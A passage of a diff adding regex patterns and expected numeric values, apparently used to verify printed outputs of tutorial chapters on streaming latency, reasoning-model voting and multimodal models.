+      "pattern": "^Streaming, config 1: p50 time to first token ([\\d.]+) s",
+      "value": "0.60"
+    },
+    "storm_plain": {
+      "pattern": "^\\s+1\\s+(\\d+)\\s+\\d+$",
+      "value": "1000"
+    },
+    "storm_jitter": {
+      "pattern": "^\\s+1\\s+\\d+\\s+(\\d+)$",
+      "value": "115"
+    }
+  },
+  "21-reasoning-models": {
+    "direct_acc": {
+      "pattern": "^direct answer\\s+([\\d.]+)",
+      "value": "0.466"
+    },
+    "single_acc": {
+      "pattern": "^vote k=1\\s+([\\d.]+)",
+      "value": "0.639"
+    },
+    "single_tokens": {
+      "pattern": "^vote k=1\\s+[\\d.]+\\s+(\\d+)",
+      "value": "439"
+    },
+    "a_per1k_single": {
+      "pattern": "^vote k=1\\s+[\\d.]+\\s+\\d+\\s+\\d+\\s+([\\d.]+)$",
+      "value": "1.458"
+    },
+    "a_vote15": {
+      "pattern": "^vote k=15\\s+([\\d.]+)",
+      "value": "0.976"
+    },
+    "a_vote15_tokens": {
+      "pattern": "^vote k=15\\s+[\\d.]+\\s+(\\d+)",
+      "value": "6600"
+    },
+    "a_per1k_vote15": {
+      "pattern": "^vote k=15\\s+[\\d.]+\\s+\\d+\\s+\\d+\\s+([\\d.]+)$",
+      "value": "0.148"
+    },
+    "a_best15": {
+      "pattern": "^best-of k=15\\s+([\\d.]+)",
+      "value": "0.928"
+    },
+    "b_vote9": {
+      "pattern": "World B[\\s\\S]*?^vote k=9\\s+([\\d.]+)",
+      "value": "0.812"
+    },
+    "b_vote15": {
+      "pattern": "World B[\\s\\S]*?^vote k=15\\s+([\\d.]+)",
+      "value": "0.814"
+    },
+    "b_best15": {
+      "pattern": "World B[\\s\\S]*?^best-of k=15\\s+([\\d.]+)",
+      "value": "0.851"
+    },
+    "b_hard_single": {
+      "pattern": "World B[\\s\\S]*?^  vote k=1\\s+easy=[\\d.]+\\s+medium=[\\d.]+\\s+hard=([\\d.]+)$",
+      "value": "0.322"
+    },
+    "b_hard_vote15": {
+      "pattern": "World B[\\s\\S]*?^  vote k=15\\s+easy=[\\d.]+\\s+medium=[\\d.]+\\s+hard=([\\d.]+)$",
+      "value": "0.153"
+    },
+    "c_spread15": {
+      "pattern": "^ 15\\s+([\\d.]+)\\s+[\\d.]+$",
+      "value": "0.974"
+    },
+    "c_trap15": {
+      "pattern": "^ 15\\s+[\\d.]+\\s+([\\d.]+)$",
+      "value": "0.209"
+    }
+  },
+  "22-multimodal": {
+    "grid224": {
+      "pattern": "^Image 224x224 -> grid (\\d+ x \\d+ = \\d+) patches",
+      "value": "14 x 14 = 196"
+    },
+    "tokens896": {
+      "pattern": "^\\s+896 px: 56 x 56 =\\s+(\\d+) tokens",
+      "value": "3136"
+    },
+    "tokens1344": {
+      "pattern": "^\\s+1344 px: 84 x 84 =\\s+(\\d+) tokens",
+      "value": "7056"
+    },
+    "ratio1344": {
+      "pattern": "^\\s+1344 px:.*\\((\\d+)x the 224 count\\)$",
+      "value": "36"
+    },
+    "embshape": {
+      "pattern": "^Patch embeddings: .* = (\\(\\d+, \\d+\\))$",
+      "value": "(196, 64)"
+    },
+    "contrast448": {
+      "pattern": "^\\s+downsampled to 448 px: stripe contrast = ([\\d.]+)$",
+      "value": "0.000"
+    },
+    "nce_matched": {
+      "pattern": "^InfoNCE loss, matched pairs:\\s+([\\d.]+)$",
+      "value": "0.002"
+    },
+    "nce_shuffled": {
+      "pattern": "^InfoNCE loss, shuffled pairs:\\s+([\\d.]+)$",
+      "value": "8.906"
+    },
+    "zs1": {
+      "pattern": "^Zero-shot accuracy on 100 new images, noise 1\\.0: ([\\d.]+)$",
+      "value": "0.95"
+    },
+    "zs6": {
+      "pattern": "^Zero-shot accuracy on 100 new images, noise 6\\.0: ([\\d.]+)$",
+      "value": "0.42"
+    },
+    "frames1s": {
+      "pattern": "^Frames for 1 second: (\\d+)",
+      "value": "98"
+    },
+    "frames30": {
+      "pattern": "^Frames for a 30-second clip: (\\d+)$",
+      "value": "2998"
+    },
+    "dom2": {
+      "pattern": "^Dominant frequency, second half: (\\d+) Hz$",
+      "value": "1000"
+    }
   }
 }
